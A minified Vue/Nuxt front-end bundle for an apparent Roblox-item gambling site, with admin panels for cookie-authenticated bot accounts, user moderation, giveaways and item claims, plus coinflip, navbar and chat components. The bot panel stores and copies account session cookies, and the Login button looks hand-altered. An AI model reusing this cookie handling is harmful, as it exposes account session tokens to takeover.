                }, [t._v("Bots")]), t._v(" "), r("form", {
                    staticClass: "bots__form",
                    on: {
                        submit: function(e) {
                            return e.preventDefault(), t.createBot(e)
                        }
                    }
                }, [r("FormInput", {
                    attrs: {
                        placeholder: "Cookie"
                    },
                    model: {
                        value: t.bot.credentials,
                        callback: function(e) {
                            t.$set(t.bot, "credentials", e)
                        },
                        expression: "bot.credentials"
                    }
                }), t._v(" "), r("FormSelect", {
                    attrs: {
                        options: ["Storage", "Fee"]
                    },
                    model: {
                        value: t.botType,
                        callback: function(e) {
                            t.botType = e
                        },
                        expression: "botType"
                    }
                }), t._v(" "), r("FormSubmit", {
                    attrs: {
                        label: "Create"
                    }
                })], 1), t._v(" "), r("ul", {
                    staticClass: "bots__list"
                }, t._l(t.feeAccounts.concat(t.storageAccounts), (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("div", {
                        staticClass: "item__header"
                    }, [r("a", {
                        staticClass: "header__title",
                        attrs: {
                            href: "https://rolimons.com/player/" + e._id,
                            target: "_blank"
                        }
                    }, [t._v(t._s(e.username)), r("span", {
                        staticClass: "text-white ml-1"
                    }, [t._v("(" + t._s(e._id) + ")")])]), t._v(" "), r("div", {
                        staticClass: "header__controls"
                    }, [r("button", {
                        staticClass: "btn-icon btn-red",
                        on: {
                            click: function(r) {
                                return t.deleteBot(e)
                            }
                        }
                    }, [r("FontAwesomeIcon", {
                        attrs: {
                            icon: ["fas", "trash"]
                        }
                    })], 1), t._v(" "), r("button", {
                        staticClass: "btn-icon btn-green",
                        on: {
                            click: function(r) {
                                return t.updateBot(e)
                            }
                        }
                    }, [r("FontAwesomeIcon", {
                        attrs: {
                            icon: ["fas", "save"]
                        }
                    })], 1), t._v(" "), r("button", {
                        staticClass: "btn-icon btn-light",
                        on: {
                            click: function(r) {
                                return t.copyCookie(e.credentials)
                            }
                        }
                    }, [r("FontAwesomeIcon", {
                        attrs: {
                            icon: ["fas", "link"]
                        }
                    })], 1)])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Type")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v(t._s(t.storageAccounts.includes(e) ? "STORAGE" : "FEE"))])]), t._v(" "), r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Games In Use")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v(t._s(e.gamesInUse))])]), t._v(" "), null != e.totalValue ? r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Total Value")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v("R$ " + t._s(t._f("longNumber")(e.totalValue)))])]) : t._e(), t._v(" "), null != e.totalRAP ? r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Total RAP")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v("R$ " + t._s(t._f("longNumber")(e.totalRAP)))])]) : t._e(), t._v(" "), r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Created At")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v(t._s(new Date(e.createdAt).toUTCString()))])]), t._v(" "), e.lastUsedAt > 0 ? r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Last Used At")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [t._v(t._s(new Date(e.lastUsedAt).toUTCString()))])]) : t._e(), t._v(" "), r("div", {
                        staticClass: "data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Is Enabled")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.isActive,
                            expression: "bot.isActive"
                        }],
                        staticClass: "form-checkbox form-checkbox-dark",
                        attrs: {
                            type: "checkbox"
                        },
                        domProps: {
                            checked: Array.isArray(e.isActive) ? t._i(e.isActive, null) > -1 : e.isActive
                        },
                        on: {
                            change: function(r) {
                                var n = e.isActive,
                                    o = r.target,
                                    c = !!o.checked;
                                if (Array.isArray(n)) {
                                    var l = t._i(n, null);
                                    o.checked ? l < 0 && t.$set(e, "isActive", n.concat([null])) : l > -1 && t.$set(e, "isActive", n.slice(0, l).concat(n.slice(l + 1)))
                                } else t.$set(e, "isActive", c)
                            }
                        }
                    })])])])])
                })), 0)])
            }), [], !1, null, "fc8f5344", null);
        e.default = component.exports;
        installComponents(component, {
            FormInput: r(100).default,
            FormSelect: r(101).default,
            FormSubmit: r(186).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(35), r(228), r(8);
        var n = r(2),
            o = {
                head: {
                    bodyAttrs: {
                        class: "overflow-y-auto bg-dark-700 text-gray-500"
                    }
                },
                data: function() {
                    return {
                        search: {
                            userId: null,
                            username: null
                        },
                        moderation: {
                            note: "",
                            category: 0
                        },
                        userAccountMap: [{
                            key: "profitValue",
                            label: "Value Profited",
                            prefix: "R$"
                        }, {
                            key: "betValue",
                            label: "Value Bet",
                            prefix: "R$"
                        }, {
                            key: "wonValue",
                            label: "Value Won",
                            prefix: "R$"
                        }, {
                            key: "lostValue",
                            label: "Value Lost",
                            prefix: "R$"
                        }, {
                            key: "gamesPlayed",
                            label: "Games Played"
                        }, {
                            key: "gamesWon",
                            label: "Games Won"
                        }, {
                            key: "gamesLost",
                            label: "Games Lost"
                        }, {
                            key: "numWarnings",
                            label: "Warnings"
                        }, {
                            key: "isBanned",
                            label: "isBanned"
                        }],
                        userAccount: null
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n, o, c, l;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    if (e.prev = 0, r = t.search, n = r.userId, o = r.username, n = parseInt(n, 10), isNaN(n) && (n = null), null != n || null != o) {
                                        e.next = 6;
                                        break
                                    }
                                    return e.abrupt("return");
                                case 6:
                                    return e.next = 8, t.$axios.$post("admin/users/search", {
                                        userId: n,
                                        username: o
                                    });
                                case 8:
                                    c = e.sent, l = c.data.userAccount, t.userAccount = l, t.$toast.success("Success!"), e.next = 18;
                                    break;
                                case 14:
                                    e.prev = 14, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message);
                                case 18:
                                case "end":
                                    return e.stop()
                            }
                        }), e, null, [
                            [0, 14]
                        ])
                    })))()
                },
                methods: {
                    updateUser: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, e.next = 3, t.$axios.$put("/admin/users/".concat(t.userAccount._id), t.userAccount);
                                    case 3:
                                        t.$fetch(), e.next = 10;
                                        break;
                                    case 6:
                                        e.prev = 6, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message);
                                    case 10:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 6]
                            ])
                        })))()
                    },
                    warnUser: function() {
                        return Object(n.a)(regeneratorRuntime.mark((function t() {
                            return regeneratorRuntime.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })))()
                    },
                    banUser: function() {
                        return Object(n.a)(regeneratorRuntime.mark((function t() {
                            return regeneratorRuntime.wrap((function(t) {
                                for (;;) switch (t.prev = t.next) {
                                    case 0:
                                    case "end":
                                        return t.stop()
                                }
                            }), t)
                        })))()
                    }
                }
            },
            c = (r(335), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "admin__users widget"
                }, [r("h1", {
                    staticClass: "widget__title"
                }, [t._v("Users")]), t._v(" "), r("form", {
                    staticClass: "users__form",
                    on: {
                        submit: function(e) {
                            return e.preventDefault(), t.$fetch()
                        }
                    }
                }, [r("FormInput", {
                    attrs: {
                        placeholder: "User ID"
                    },
                    model: {
                        value: t.search.userId,
                        callback: function(e) {
                            t.$set(t.search, "userId", e)
                        },
                        expression: "search.userId"
                    }
                }), t._v(" "), r("FormInput", {
                    attrs: {
                        placeholder: "Username"
                    },
                    model: {
                        value: t.search.username,
                        callback: function(e) {
                            t.$set(t.search, "username", e)
                        },
                        expression: "search.username"
                    }
                }), t._v(" "), r("FormSubmit", {
                    attrs: {
                        label: "Search"
                    }
                })], 1), t._v(" "), t.$fetchState.pending ? r("div", [r("Spinner")], 1) : r("div", [t.userAccount ? r("div", {
                    staticClass: "user"
                }, [r("div", {
                    staticClass: "user__header"
                }, [r("div", {
                    staticClass: "header__title"
                }, [r("span", {
                    staticClass: "title__name"
                }, [t._v(t._s(t.userAccount.username))]), t._v(" "), r("span", {
                    staticClass: "title__id"
                }, [t._v("(" + t._s(t.userAccount._id) + ")")])]), t._v(" "), r("div", {
                    staticClass: "header__controls"
                }, [r("button", {
                    staticClass: "btn-icon btn-green",
                    on: {
                        click: function(e) {
                            return t.updateUser()
                        }
                    }
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "save"]
                    }
                })], 1)])]), t._v(" "), r("div", {
                    staticClass: "user__data"
                }, [r("StatList", {
                    attrs: {
                        map: t.userAccountMap,
                        data: t.userAccount
                    }
                }), t._v(" "), r("div", {
                    staticClass: "data"
                }, [r("span", {
                    staticClass: "data__label"
                }, [t._v("Is Muted")]), t._v(" "), r("span", {
                    staticClass: "data__value"
                }, [r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.userAccount.isMuted,
                        expression: "userAccount.isMuted"
                    }],
                    staticClass: "form-checkbox form-checkbox-dark",
                    attrs: {
                        type: "checkbox"
                    },
                    domProps: {
                        checked: Array.isArray(t.userAccount.isMuted) ? t._i(t.userAccount.isMuted, null) > -1 : t.userAccount.isMuted
                    },
                    on: {
                        change: function(e) {
                            var r = t.userAccount.isMuted,
                                n = e.target,
                                o = !!n.checked;
                            if (Array.isArray(r)) {
                                var c = t._i(r, null);
                                n.checked ? c < 0 && t.$set(t.userAccount, "isMuted", r.concat([null])) : c > -1 && t.$set(t.userAccount, "isMuted", r.slice(0, c).concat(r.slice(c + 1)))
                            } else t.$set(t.userAccount, "isMuted", o)
                        }
                    }
                })])]), t._v(" "), r("div", {
                    staticClass: "data"
                }, [r("span", {
                    staticClass: "data__label"
                }, [t._v("Is VIP")]), t._v(" "), r("span", {
                    staticClass: "data__value"
                }, [r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.userAccount.isVIP,
                        expression: "userAccount.isVIP"
                    }],
                    staticClass: "form-checkbox form-checkbox-dark",
                    attrs: {
                        type: "checkbox"
                    },
                    domProps: {
                        checked: Array.isArray(t.userAccount.isVIP) ? t._i(t.userAccount.isVIP, null) > -1 : t.userAccount.isVIP
                    },
                    on: {
                        change: function(e) {
                            var r = t.userAccount.isVIP,
                                n = e.target,
                                o = !!n.checked;
                            if (Array.isArray(r)) {
                                var c = t._i(r, null);
                                n.checked ? c < 0 && t.$set(t.userAccount, "isVIP", r.concat([null])) : c > -1 && t.$set(t.userAccount, "isVIP", r.slice(0, c).concat(r.slice(c + 1)))
                            } else t.$set(t.userAccount, "isVIP", o)
                        }
                    }
                })])])], 1), t._v(" "), r("div", {
                    staticClass: "user__controls"
                }, [r("div", {
                    staticClass: "controls__moderation"
                }, [r("FormInput", {
                    attrs: {
                        placeholder: "Note"
                    }
                }), t._v(" "), r("FormSelect", {
                    attrs: {
                        options: ["DECLINE/REJECTION", "VALIDATION", "OTHER"]
                    }
                }), t._v(" "), r("button", {
                    staticClass: "btn btn-yellow",
                    attrs: {
                        disabled: ""
                    }
                }, [t._v("Warn")]), t._v(" "), r("button", {
                    staticClass: "btn btn-red",
                    attrs: {
                        disabled: ""
                    }
                }, [t._v("Ban")])], 1)])]) : t._e()])])
            }), [], !1, null, "13b8bd6f", null);
        e.default = component.exports;
        installComponents(component, {
            FormInput: r(100).default,
            FormSubmit: r(186).default,
            Spinner: r(51).default,
            StatList: r(183).default,
            FormSelect: r(101).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(19), r(17), r(29), r(49), r(50), r(34), r(31);
        var n = r(13),
            o = (r(8), r(2));

        function c(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function l(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? c(Object(source), !0).forEach((function(e) {
                    Object(n.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : c(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        var d = {
                data: function() {
                    return {
                        giveawayType: 0,
                        giveaway: {
                            feeAccountId: null,
                            giveawayDuration: null,
                            assetId: null
                        }
                    }
                },
                methods: {
                    createGiveaway: function() {
                        var t = this;
                        return Object(o.a)(regeneratorRuntime.mark((function e() {
                            var r;
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, r = 0 == t.giveawayType ? "NormalGiveaway" : "FeaturedGiveaway", e.next = 4, t.$axios.$post("admin/giveaway", l(l({}, t.giveaway), {}, {
                                            giveawayType: r
                                        }));
                                    case 4:
                                        t.$toast.success("Success!"), e.next = 11;
                                        break;
                                    case 7:
                                        e.prev = 7, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message);
                                    case 11:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 7]
                            ])
                        })))()
                    }
                }
            },
            f = (r(337), r(0)),
            component = Object(f.a)(d, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "admin__giveaway widget"
                }, [r("h1", {
                    staticClass: "widget__title"
                }, [t._v("Giveaway")]), t._v(" "), r("form", {
                    staticClass: "giveaway__form",
                    on: {
                        submit: function(e) {
                            return e.preventDefault(), t.createGiveaway(e)
                        }
                    }
                }, [r("FormInput", {
                    attrs: {
                        placeholder: "Fee Account ID"
                    },
                    model: {
                        value: t.giveaway.feeAccountId,
                        callback: function(e) {
                            t.$set(t.giveaway, "feeAccountId", e)
                        },
                        expression: "giveaway.feeAccountId"
                    }
                }), t._v(" "), r("FormInput", {
                    attrs: {
                        placeholder: "Asset ID"
                    },
                    model: {
                        value: t.giveaway.assetId,
                        callback: function(e) {
                            t.$set(t.giveaway, "assetId", e)
                        },
                        expression: "giveaway.assetId"
                    }
                }), t._v(" "), r("FormInput", {
                    attrs: {
                        placeholder: "Duration in seconds"
                    },
                    model: {
                        value: t.giveaway.giveawayDuration,
                        callback: function(e) {
                            t.$set(t.giveaway, "giveawayDuration", e)
                        },
                        expression: "giveaway.giveawayDuration"
                    }
                }), t._v(" "), r("FormSelect", {
                    attrs: {
                        options: ["Normal", "Featured"]
                    },
                    model: {
                        value: t.giveawayType,
                        callback: function(e) {
                            t.giveawayType = e
                        },
                        expression: "giveawayType"
                    }
                }), t._v(" "), r("FormSubmit", {
                    attrs: {
                        label: "Create"
                    }
                })], 1)])
            }), [], !1, null, "24ed9bef", null);
        e.default = component.exports;
        installComponents(component, {
            FormInput: r(100).default,
            FormSelect: r(101).default,
            FormSubmit: r(186).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(8);
        var n = r(2),
            o = {
                data: function() {
                    return {
                        claims: []
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    return e.next = 2, t.$axios.$get("/admin/claims");
                                case 2:
                                    r = e.sent, n = r.data.claims, t.claims = n;
                                case 5:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                methods: {
                    deleteClaim: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, r.next = 3, e.$axios.$delete("/admin/claims/".concat(t._id));
                                    case 3:
                                        e.$toast.success("Success!"), e.$fetch(), r.next = 11;
                                        break;
                                    case 7:
                                        r.prev = 7, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error(r.t0.response ? r.t0.response.data.error : r.t0.message);
                                    case 11:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 7]
                            ])
                        })))()
                    },
                    updateClaim: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, r.next = 3, e.$axios.$put("/admin/claims/".concat(t._id));
                                    case 3:
                                        e.$toast.success("Success!"), e.$fetch(), r.next = 11;
                                        break;
                                    case 7:
                                        r.prev = 7, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error(r.t0.response ? r.t0.response.data.error : r.t0.message);
                                    case 11:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 7]
                            ])
                        })))()
                    }
                }
            },
            c = (r(339), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "admin__claims widget"
                }, [t._m(0), t._v(" "), r("ul", {
                    staticClass: "claims__list"
                }, [r("h1", [t._v("Don't remove or update any of these unless necessary (like someone lost their items and can't redeem them)")]), t._v(" "), t._l(t.claims, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("button", {
                        staticClass: "btn-icon btn-red",
                        on: {
                            click: function(r) {
                                return t.deleteClaim(e)
                            }
                        }
                    }, [r("FontAwesomeIcon", {
                        attrs: {
                            icon: ["fas", "trash"]
                        }
                    })], 1), t._v(" "), r("button", {
                        staticClass: "btn-icon btn-green",
                        on: {
                            click: function(r) {
                                return t.updateClaim(e)
                            }
                        }
                    }, [r("FontAwesomeIcon", {
                        attrs: {
                            icon: ["fas", "save"]
                        }
                    })], 1), t._v(" "), r("StatListItem", {
                        attrs: {
                            label: "Current Value",
                            prefix: "R$",
                            value: e.currentValue
                        }
                    }), t._v(" "), r("StatListItem", {
                        attrs: {
                            label: "Original Value",
                            prefix: "R$",
                            value: e.originalValue
                        }
                    }), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Claim ID")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(e._id))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Bot ID")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(e.storageAccountId))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("User ID")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(e.userAccountId))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Created At")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(new Date(e.createdAt).toUTCString()))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Is Redeemable")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [r("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: e.isRedeemable,
                            expression: "claim.isRedeemable"
                        }],
                        staticClass: "form-checkbox form-checkbox-dark",
                        attrs: {
                            type: "checkbox"
                        },
                        domProps: {
                            checked: Array.isArray(e.isRedeemable) ? t._i(e.isRedeemable, null) > -1 : e.isRedeemable
                        },
                        on: {
                            change: function(r) {
                                var n = e.isRedeemable,
                                    o = r.target,
                                    c = !!o.checked;
                                if (Array.isArray(n)) {
                                    var l = t._i(n, null);
                                    o.checked ? l < 0 && t.$set(e, "isRedeemable", n.concat([null])) : l > -1 && t.$set(e, "isRedeemable", n.slice(0, l).concat(n.slice(l + 1)))
                                } else t.$set(e, "isRedeemable", c)
                            }
                        }
                    })])])])], 1)
                }))], 2)])
            }), [function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("div", {
                    staticClass: "widget__title"
                }, [e("h1", [this._v("Claims")])])
            }], !1, null, "57489aaa", null);
        e.default = component.exports;
        installComponents(component, {
            StatListItem: r(99).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(40), r(43);
        var n = {
                props: {
                    lockedOption: {
                        type: null | String,
                        default: null
                    }
                },
                data: function() {
                    return {
                        selectableOptions: ["Heads", "Tails"],
                        selectedOption: "Heads"
                    }
                },
                methods: {
                    selectOption: function(option) {
                        try {
                            if (this.lockedOption) throw new Error("This field is locked");
                            if (!this.selectableOptions.includes(option)) throw new Error("This option does not exist");
                            this.selectedOption = option, this.$emit("input", this.selectedOption), this.$toast.info("Selected ".concat(this.selectedOption))
                        } catch (t) {
                            console.error(t), this.$toast.error(t.message)
                        }
                    }
                }
            },
            o = (r(347), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "option-selector"
                }, [r("ul", {
                    staticClass: "option-selector__list"
                }, t._l(t.selectableOptions, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("img", {
                        staticClass: "item__img",
                        class: {
                            isSelected: t.lockedOption == e || t.selectedOption == e, isDisabled: null != t.lockedOption && t.lockedOption != e
                        },
                        attrs: {
                            width: "100px",
                            height: "auto",
                            src: "/img/coins/" + e.toLowerCase() + ".png"
                        },
                        on: {
                            click: function(r) {
                                return t.selectOption(e)
                            }
                        }
                    })])
                })), 0)])
            }), [], !1, null, "36d909ff", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(8);
        var n = r(2),
            o = {
                props: {
                    links: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    },
                    hrefs: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    }
                },
                methods: {
                    logout: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.next = 2, t.$auth.logout();
                                    case 2:
                                        window.location.reload();
                                    case 3:
                                    case "end":
                                        return e.stop()
                                }
                            }), e)
                        })))()
                    }
                }
            },
            c = (r(313), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ul", {
                    staticClass: "navbar__links"
                }, [t._l(t.links, (function(link, i) {
                    return r("NavLink", {
                        key: i,
                        attrs: {
                            url: link.url,
                            label: link.label,
                            icon: link.icon,
                            maximized: link.maximized
                        }
                    })
                })), t._v(" "), t._l(t.hrefs, (function(t, i) {
                    return r("HrefLink", {
                        key: "HREF-" + i,
                        attrs: {
                            url: t.url,
                            label: t.label,
                            icon: t.icon,
                            maximized: t.maximized
                        }
                    })
                })), t._v(" "), r("li", {
                    staticClass: "lol"
                }, [t.$auth.loggedIn ? r("button", {
                    staticClass: "btn btn-red btn-pill",
                    on: {
                        click: function(e) {
                            return t.logout()
                        }
                    }
        
    },
    [t._v("Logout")]) : r("NuxtLink", {
                    staticClass: "btn btn-blue btn-pill",
                    
                    attrs: {
                        tag: "button",
                    id: "myButton",
      }
                }, [t._v("Login")]), t._v(" "), t.$auth.loggedIn && t.$auth.user._id < 0 ? r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/admin",
                        tag: "button",   }
                }, [t._v("Admin")]) : t._e()], 1)], 2)
            }), [], !1, null, "52c84507", null);
        e.default = component.exports;
        installComponents(component, {
            NavLink: r(439).default,
            HrefLink: r(440).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                props: {
                    type: {
                        type: String,
                        default: "None"
                    },
                    players: {
                        type: Number,
                        default: 0
                    },
                    winner: {
                        type: null | Object,
                        default: null
                    },
                    userAsset: {
                        type: null | Object,
                        default: null
                    },
                    endedAt: {
                        type: null | Number,
                        default: 0
                    }
                },
                data: function() {
                    return {
                        tooltips: {
                            featured: {
                                trigger: "hover",
                                placement: "bottom-end",
                                offset: "5px",
                                content: "Your number of entries is based on the amount of designated games you have played since the event has started"
                            },
                            normal: {
                                trigger: "hover",
                                placement: "bottom-end",
                                offset: "5px",
                                content: "Single entry giveaway, you must play at least one of the designated games since the event has started"
                            },
                            coinflip: {
                                trigger: "hover",
                                placement: "bottom-end",
                                offset: "5px",
                                content: "Coinflip games are counted in this event"
                            },
                            jackpot: {
                                trigger: "hover",
                                placement: "bottom-end",
                                offset: "5px",
                                content: "Jackpot games are counted in this event"
                            }
                        }
                    }
                }
            },
            o = (r(317), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "giveaway"
                }, [r("div", {
                    staticClass: "pills"
                }, ["FeaturedGiveaway" == t.type ? r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: t.tooltips.featured,
                        expression: "tooltips.featured"
                    }],
                    staticClass: "pill green"
                }, [t._v("Featured")]) : r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: t.tooltips.normal,
                        expression: "tooltips.normal"
                    }],
                    staticClass: "pill gray"
                }, [t._v("Normal")]), t._v(" "), r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: t.tooltips.coinflip,
                        expression: "tooltips.coinflip"
                    }],
                    staticClass: "pill blue"
                }, [t._v("Coinflip")]), t._v(" "), r("div", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: t.tooltips.jackpot,
                        expression: "tooltips.jackpot"
                    }],
                    staticClass: "pill gold"
                }, [t._v("Jackpot")])]), t._v(" "), r("div", {
                    staticClass: "giveaway__section"
                }, [r("span", [t._v("Players:")]), t._v(" "), r("span", {
                    staticClass: "section__players"
                }, [t._v(t._s(t.players))])]), t._v(" "), r("div", {
                    staticClass: "giveaway__section giveaway__details"
                }, [r("div", {
                    staticClass: "details__value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.userAsset.marketValue)))]), t._v(" "), r("div", {
                    staticClass: "details__name"
                }, [t._v(t._s(t.userAsset.name))]), t._v(" "), r("img", {
                    staticClass: "details__image",
                    attrs: {
                        src: t.$util.getAssetThumbnail(t.userAsset.assetId)
                    }
                }), t._v(" "), t.winner ? r("NuxtLink", {
                    attrs: {
                        tag: "div",
                        to: "/profiles/" + t.winner.userId
                    }
                }, [r("div", {
                    staticClass: "details__winner"
                }, [t._v(t._s(t.winner.username))]), t._v(" "), r("span", [t._v("won the giveaway!")])]) : r("div", [r("countdown", {
                    attrs: {
                        time: t.endedAt - Date.now(),
                        interval: 1e3
                    },
                    scopedSlots: t._u([{
                        key: "default",
                        fn: function(e) {
                            return [r("span", [t._v(t._s(e.hours) + "h")]), t._v(" "), r("span", [t._v(t._s(e.minutes) + "m")]), t._v(" "), r("span", [t._v(t._s(e.seconds) + "s")])]
                        }
                    }])
                })], 1)], 1)])
            }), [], !1, null, "f1a6f620", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(44);
        var n = {
                props: {
                    userId: {
                        type: Number,
                        required: !0
                    },
                    username: {
                        type: String,
                        required: !0
                    },
                    content: {
                        type: String,
                        required: !0
                    },
                    isVip: {
                        type: Boolean,
                        default: !1
                    },
                    isAdmin: {
                        type: Boolean,
                        default: !1
                    }
                }
            },
            o = (r(319), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "message"
                }, [r("div", {
                    staticClass: "message__header"
                }, [r("NuxtLink", {
                    attrs: {
                        to: "/profiles/" + t.userId
                    }
                }, [r("img", {
                    staticClass: "header__avatar",
                    attrs: {
                        src: t.$util.getUserThumbnail(t.userId),
                        width: "32px",
                        height: "32px"
                    }
                })]), t._v(" "), r("span", {
                    staticClass: "header__username",
                    class: {
                        isVip: t.isVip, isAdmin: t.isAdmin
                    }
                }, [t._v(t._s(t.username))])], 1), t._v(" "), r("div", {
                    staticClass: "message__body"
                }, [r("p", {
                    staticClass: "body__content",
                    class: {
                        isAdmin: t.isAdmin
                    }
                }, [t._v(t._s(t.content))])])])
            }), [], !1, null, "1626878e", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    label: {
                        type: String,
                        required: !0
                    },
                    checkboxColor: {
                        type: String,
                        default: "text-blue-500"
                    },
                    labelColor: {
